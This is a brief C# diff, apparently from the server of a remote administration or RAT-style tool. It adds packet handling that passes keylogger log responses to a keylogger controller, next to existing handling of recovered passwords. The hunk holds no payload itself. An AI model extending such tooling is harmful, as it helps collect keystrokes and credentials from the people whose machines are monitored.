@@ -67,6 +67,10 @@ namespace Serveur.Packets
             {
                 FrmPasswordRecoveryController.HandleGetPasswordsResponse(client, (GetPasswordsResponse)packet);
             }
+            else if (type == TypePackets.GetKeyLoggerLogsResponse)
+            {
+                FrmKeyLoggerController.getKeyLoggerLogsResponse(client, (GetKeyLoggerLogsResponse)packet);
+            }
         }
     }
 }
